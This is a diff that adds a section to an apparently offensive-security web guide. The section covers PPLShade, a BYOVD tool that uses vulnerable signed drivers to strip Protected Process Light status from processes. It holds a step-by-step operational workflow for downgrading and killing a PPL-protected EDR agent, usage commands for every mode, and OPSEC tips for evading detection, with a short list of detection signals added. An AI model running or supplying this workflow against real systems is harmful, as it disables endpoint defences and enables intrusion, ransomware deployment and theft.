@@ -309,6 +309,103 @@ EDRSandblast.exe --dump-creds  # Dump credentials after disabling EDR
 # Requires admin access to load the driver
 # Driver is legitimately signed — passes DSE</code></pre>
 
+<h3>PPLShade — PPL / PP Manipulation via BYOVD</h3>
+
+<p>PPLShade is a multi-driver BYOVD tool that targets Protected Process Light (PPL) and Protected Process (PP) status at the kernel level. Rather than blindly killing EDR processes, it gives you surgical control over <em>which protection level</em> a process runs at — you can query, downgrade, strip, set, or add PPL/PP to any process, then optionally terminate it. All offset resolution is dynamic (from <code>ntoskrnl</code> exports at runtime) — no hardcoded offsets that break across Windows builds.</p>
+
+<p>PPLShade automatically probes supported driver symlinks and uses whichever is currently loaded on the target system. Drivers use <code>MmMapIoSpace</code> for physical memory mapping and <code>NtQuerySystemInformation</code> (SuperFetch) for VA→PA translation.</p>
+
+<p><strong>Supported drivers:</strong></p>
+<ul>
+  <li><code>LECOMAx64.sys</code> — symlink: <code>\\.\LECOMA64_2</code></li>
+  <li><code>ipctype.sys</code> — symlink: <code>\\.\IPCType</code></li>
+  <li><code>mtxC9CB.sys</code> — symlink: <code>\\.\DosMtxVxd</code></li>
+</ul>
+
+<pre><code># Build requirements:
+# - Visual Studio 2022
+# - C++ Language Standard: /std:c++latest
+# - Configuration: Release | x64
+# - Produces /MT standalone executable — no vcredist dependency
+
+# GitHub: github.com/redteamfortress/PPLShade
+# Author: @j3h4ck (Jehad Abudagga)</code></pre>
+
+<p><strong>Usage:</strong></p>
+
+<pre><code># Load a driver with a randomized service name (copies to System32\drivers automatically)
+PPLShade.exe load LECOMAx64.sys
+
+# Unload — stop and delete the driver service
+PPLShade.exe unload
+
+# Enumerate all protected processes: lists PID, name, protection level,
+# signer type, signature levels, and kernel EPROCESS address
+PPLShade.exe list
+
+# Query protection status of a specific process
+PPLShade.exe get &lt;PID&gt;
+
+# Modify protection level (PP or PPL, with specified signer type)
+PPLShade.exe set &lt;PID&gt; &lt;PP|PPL&gt; &lt;SignerType&gt;
+
+# Add protection to an unprotected process (useful for self-protection)
+PPLShade.exe protect &lt;PID&gt; &lt;PP|PPL&gt; &lt;SignerType&gt;
+
+# Strip all protection from a process — leaves it killable by any user-land process
+PPLShade.exe unprotect &lt;PID&gt;
+
+# Unprotect and immediately terminate (one step — no separate kill needed)
+PPLShade.exe kill &lt;PID&gt;
+
+# Supported signer types for set/protect:
+# Authenticode | CodeGen | Antimalware | Lsa | Windows | WinTcb | WinSystem | App</code></pre>
+
+<p><strong>Operational workflow — neutralize a PPL-protected EDR without dropping the process:</strong></p>
+
+<pre><code># Step 1: Identify which drivers are already on the target
+PPLShade.exe list  # auto-probes all three symlinks
+
+# Step 2: Find the EDR's PID and confirm it's PPL-protected
+PPLShade.exe list
+# Output example:
+#   PID: 1234  Name: SentinelAgent.exe  Level: PPL  Signer: Antimalware
+#   EPROCESS: 0xffff...
+
+# Step 3: Downgrade protection — drop it from PPL Antimalware to PPL App
+# (still "protected" to watchdog monitors but now killable from user-land)
+PPLShade.exe set 1234 PPL App
+
+# Step 4: Verify the change took effect
+PPLShade.exe get 1234
+
+# Step 5: Use preferred kill method now that tamper protection is stripped
+taskkill /F /PID 1234
+
+# --- OR --- strip + kill in one command:
+PPLShade.exe kill 1234
+
+# Step 6: Unload driver
+PPLShade.exe unload</code></pre>
+
+<p><strong>How dynamic offset resolution works:</strong> PPLShade walks <code>ntoskrnl</code> exports to resolve the offsets of PPL-related fields in the <code>EPROCESS</code> structure at runtime. This means it does not break when Microsoft shifts structure layouts between Windows 10/11 builds — the same binary works across supported systems without rebuilding. VA→PA translation uses the <code>SuperFetch</code> path (<code>NtQuerySystemInformation</code> class 0x86) to convert virtual addresses to physical addresses before using <code>MmMapIoSpace</code> to map and modify kernel memory from user-mode.</p>
+
+<pre><code># Detection signals for PPLShade:
+# 1. Service creation (Event ID 7045) — kernel driver type, randomized service name
+#    PPLShade randomizes service names to avoid static detection
+# 2. Sysmon Event ID 6 — driver loaded from System32\drivers\ (copied automatically)
+# 3. NtQuerySystemInformation calls with class 0x86 (SuperFetch/PFPFN)
+#    — used for VA-to-PA translation; rarely legitimate from user-land processes
+# 4. EPROCESS field modifications — detectable by kernel integrity products (PatchGuard)
+# 5. Protected process losing tamper-protected status without corresponding uninstall
+
+# OPSEC considerations:
+# - Driver is loaded and renamed on copy — hash may differ from known samples
+# - Service name is randomized — avoid static service-name detection
+# - Unload immediately after the protection change to minimize dwell time
+# - On targets where one of the three drivers is already loaded (e.g., LECOMAx64),
+#   you can skip the load step entirely — open the existing symlink directly</code></pre>
+
 <h2>Writing a BYOVD Exploit</h2>
 
 <pre><code>// Minimal BYOVD exploit structure (C/C++)
@@ -491,4 +588,5 @@ Get-WmiObject Win32_SystemDriver |
   <li>The Hacker News — 2,500 truesight.sys Variants (2025) — <code>thehackernews.com/2025/02/2500-truesightsys-driver-variants.html</code></li>
   <li>Check Point Research — Breaking Boundaries: Investigating Vulnerable Drivers (2024) — <code>research.checkpoint.com/2024/breaking-boundaries-investigating-vulnerable-drivers-and-mitigating-risks/</code></li>
   <li>Help Net Security — RansomHub EDRKillShifter shared across 8 groups (2025) — <code>helpnetsecurity.com/2025/03/26/ransomhub-edrkillshifter-tool/</code></li>
+  <li>PPLShade — Multi-driver BYOVD PPL/PP manipulation — <code>github.com/redteamfortress/PPLShade</code></li>
 </ul>
